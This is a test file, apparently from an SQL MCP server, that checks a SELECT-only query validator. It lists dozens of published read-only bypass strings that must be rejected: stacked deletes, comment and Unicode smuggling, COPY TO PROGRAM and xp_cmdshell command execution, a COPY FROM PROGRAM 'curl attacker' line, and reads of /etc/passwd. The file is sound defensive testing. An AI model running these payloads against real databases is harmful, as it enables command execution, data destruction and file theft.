/**
 * The published read-only bypass families, pinned against SELECT-only mode.
 *
 * Sources: Maximilian Hildebrand, "read-only bypasses in 14 SQL MCP servers"
 * (m10x.de, 2026-07-04), and AWS bulletin 2026-104 / CVE-2026-87911 (COPY ... TO
 * PROGRAM through read-only validation). Every case here must be rejected. This
 * filter is the second net: the database role is the boundary (see the privilege
 * check in src/database/privileges.ts).
 */
import { SecurityManager } from '../../src/classes/SecurityManager.js';

type Dialect = 'postgresql' | 'mysql' | 'mssql' | 'sqlite';
const ALL: Dialect[] = ['postgresql', 'mysql', 'mssql', 'sqlite'];

/** [family, sql, dialects it must be rejected on] */
const BYPASSES: Array<[string, string, Dialect[]]> = [
  // Stacked statements
  ['stacked', 'SELECT 1; DELETE FROM t', ALL],
  ['stacked', 'BEGIN TRANSACTION READ ONLY; SELECT 1; COMMIT; DELETE FROM t', ALL],
  ['stacked without a semicolon (T-SQL)', 'SELECT 1 DELETE FROM t', ['mssql']],

  // Comments as whitespace, or hiding a second statement
  ['comment as whitespace', 'DROP/**/TABLE t', ALL],
  ['comment as whitespace', 'SELECT 1;/**/DELETE FROM t', ALL],
  ['line comment hides a statement', 'SELECT 1 --\n; DELETE FROM t', ALL],
  ['line comment hides a statement', 'SELECT 1 -- ; \n DELETE FROM t', ALL],
  ['# comment hides a statement', 'SELECT 1 #\n; DELETE FROM t', ALL],
  ['# comment hides a statement', "SELECT '#' ; DELETE FROM t", ALL],
  ['nested block comment', '/* a /* b */ ; DROP TABLE users */ SELECT 1', ALL],
  ['MySQL version comment', 'SELECT 1 /*!50000 ; DELETE FROM t */', ALL],

  // SET in every shape
  ['SET', 'SET default_transaction_read_only = off', ALL],
  ['SET', 'SET SESSION CHARACTERISTICS AS TRANSACTION READ WRITE', ALL],
  ['SET', "SET PASSWORD = 'x'", ALL],
  ['SET', "SET PASSWORD FOR 'root'@'%' = 'x'", ALL],
  ['SET', 'SET GLOBAL max_connections = 1', ALL],
  ['SET', 'SET IDENTITY_INSERT t ON', ALL],
  ['SET', 'SELECT 1; SET GLOBAL read_only = 0', ALL],

  // Data-modifying CTEs
  ['CTE DML', 'WITH x AS (DELETE FROM t RETURNING *) SELECT * FROM x', ALL],
  ['CTE DML', 'WITH x AS (INSERT INTO t VALUES (1) RETURNING *) SELECT * FROM x', ALL],
  ['CTE DML', 'WITH x AS (UPDATE t SET a = 1 RETURNING *) SELECT * FROM x', ALL],
  ['CTE DML', 'WITH x AS (SELECT 1) DELETE FROM t', ALL],
  ['CTE DML', 'WITH x AS (SELECT 1) MERGE INTO t USING x ON 1 = 1 WHEN MATCHED THEN DELETE', ALL],

  // SELECT ... INTO
  ['SELECT INTO', 'SELECT * INTO new_table FROM t', ALL],
  ['SELECT INTO', 'SELECT * INTO TEMP new_table FROM t', ALL],
  ['SELECT INTO', "SELECT * FROM t INTO OUTFILE '/tmp/x'", ALL],
  ['SELECT INTO', "SELECT * FROM t INTO DUMPFILE '/tmp/x'", ALL],
  ['SELECT INTO', 'SELECT 1 INTO @v', ALL],

  // COPY (CVE-2026-87911)
  ['COPY', "COPY (SELECT 1) TO PROGRAM 'id'", ALL],
  ['COPY', "COPY t FROM PROGRAM 'curl attacker'", ALL],
  ['COPY', "COPY t TO '/tmp/x'", ALL],

  // Side-effect functions inside a plain SELECT (PostgreSQL)
  ['side-effect function', "SELECT set_config('default_transaction_read_only', 'off', false)", ALL],
  ['side-effect function', "SELECT set_config('transaction_read_only', 'off', true)", ALL],
  ['side-effect function', 'SELECT pg_terminate_backend(pid) FROM pg_stat_activity', ALL],
  ['side-effect function', 'SELECT pg_cancel_backend(pid) FROM pg_stat_activity', ALL],
  ['side-effect function', 'SELECT pg_reload_conf()', ALL],
  ['side-effect function', "SELECT lo_export(16409, '/tmp/x')", ALL],
  ['side-effect function', "SELECT lo_import('/etc/passwd')", ALL],
  ['side-effect function', "SELECT lo_from_bytea(0, 'x')", ALL],
  ['side-effect function', 'SELECT lo_unlink(16409)', ALL],
  ['side-effect function', "SELECT pg_read_file('/etc/passwd')", ALL],
  ['side-effect function', "SELECT pg_read_binary_file('/etc/passwd')", ALL],
  ['side-effect function', "SELECT pg_ls_dir('/')", ALL],
  ['side-effect function', "SELECT pg_file_write('/tmp/x', 'y', false)", ALL],
  ['side-effect function', "SELECT dblink_exec('dbname=app', 'DELETE FROM t')", ALL],
  ['side-effect function', "SELECT * FROM dblink('dbname=app', 'SELECT 1') AS x(a int)", ALL],
  ['side-effect function', "SELECT dblink_connect('c', 'dbname=app')", ALL],
  // A sequence advance is a write that survives a rollback.
  ['side-effect function', "SELECT nextval('seq')", ALL],
  ['side-effect function', "SELECT setval('seq', 1)", ALL],
  ['side-effect function', 'SELECT pg_sleep(100)', ALL],

  // SQL Server
  ['SQL Server', "EXEC xp_cmdshell 'whoami'", ALL],
  ['SQL Server', "EXECUTE xp_cmdshell 'whoami'", ALL],
  ['SQL Server', "EXEC('DELETE FROM t')", ALL],
  ['SQL Server', "SELECT 1 EXEC('DELETE FROM t')", ALL],
  ['SQL Server', "SELECT * FROM OPENROWSET('SQLNCLI', 'Server=x;', 'SELECT 1')", ALL],
  ['SQL Server', "SELECT * FROM OPENQUERY(linked, 'DELETE FROM t')", ALL],
  ['SQL Server', "SELECT * FROM OPENDATASOURCE('SQLNCLI', 'Data Source=x').db.dbo.t", ALL],
  ['SQL Server', "SELECT 1 WAITFOR DELAY '00:01:00'", ALL],
  ['SQL Server', "sp_helpdesk_reset 'x'", ALL],
  ['SQL Server', 'sp_help; DROP TABLE t', ALL],

  // MySQL
  ['MySQL', 'SELECT SLEEP(100)', ALL],
  ['MySQL', "SELECT BENCHMARK(100000000, MD5('x'))", ALL],
  ['MySQL', "SELECT LOAD_FILE('/etc/passwd')", ALL],
  ['MySQL', "LOAD DATA INFILE '/etc/passwd' INTO TABLE t", ALL],
  ['MySQL', 'HANDLER t OPEN', ALL],
  ['MySQL', 'DO SLEEP(100)', ALL],

  // Other lead commands that write or execute
  ['lead command', 'DO $$ BEGIN DELETE FROM t; END $$', ALL],
  ['lead command', 'PREPARE p AS DELETE FROM t', ALL],
  ['lead command', 'CALL proc()', ALL],
  ['lead command', 'LOCK TABLE t', ALL],
  ['lead command', 'VACUUM', ALL],
  ['lead command', 'ANALYZE t', ALL],
  ['lead command', 'EXPLAIN ANALYZE DELETE FROM t', ALL],
  ['lead command', 'EXPLAIN ANALYZE SELECT 1', ALL],
  ['lead command', "ATTACH DATABASE '/tmp/x.db' AS x", ALL],
  ['lead command', 'PRAGMA writable_schema = 1', ALL],
  ['row locks', 'SELECT * FROM t FOR UPDATE', ALL],

  // Case and Unicode tricks
  ['case', 'dElEtE FROM t', ALL],
  ['case', 'SeLeCt 1; dElEtE FROM t', ALL],
  ['case', 'WITH x AS (dElEtE FROM t RETURNING *) SELECT * FROM x', ALL],
  ['unicode', 'ＤＥＬＥＴＥ FROM t', ALL],
  ['unicode', 'SELECT 1; ＤＥＬＥＴＥ FROM t', ALL],
  ['unicode', 'SELECT 1;​DELETE FROM t', ALL],
  ['unicode', 'WITH x AS (DEL​ETE FROM t RETURNING *) SELECT * FROM x', ALL],
  ['unicode', 'DEL​ETE FROM t', ALL],
  ['unicode', 'SELECT 1 ; DELETE FROM t', ALL],
  ['unicode', 'SELECT 1; DELETE FROM t', ALL],
];

/** Reads that must keep working, so the fixes do not overreach. */
const READS: Array<[string, Dialect[]]> = [
  ['SELECT 1', ALL],
  ['SELECT 1;', ALL],
  ["SELECT 'DELETE FROM t' AS text", ALL],
  ['SELECT description, setting FROM t', ALL],
  ['SELECT currval_view, next_value FROM t', ALL],
  ["SELECT current_setting('default_transaction_read_only')", ALL],
  ['SELECT pid, state FROM pg_stat_activity', ALL],
  ["SELECT 'naïve café' AS word", ALL],
  ['SELECT "Straße" FROM t', ALL],
  ['WITH x AS (SELECT 1 AS a) SELECT a FROM x', ALL],
  ['SHOW TABLES', ['mysql']],
  ['EXPLAIN SELECT * FROM t', ALL],
];

describe('SELECT-only mode against the published bypass families', () => {
  const security = new SecurityManager({ max_query_length: 10000 });

  const cases = BYPASSES.flatMap(([family, sql, dialects]) =>
    dialects.map((d) => [family, d, sql] as const)
  );
  test.each(cases)('%s on %s is rejected: %j', (_family, dialect, sql) => {
    const result = security.validateSelectOnlyQuery(sql, dialect);
    expect(result.allowed).toBe(false);
  });

  const reads = READS.flatMap(([sql, dialects]) => dialects.map((d) => [d, sql] as const));
  test.each(reads)('a read on %s still passes: %j', (dialect, sql) => {
    const result = security.validateSelectOnlyQuery(sql, dialect);
    expect(result).toMatchObject({ allowed: true });
  });
});
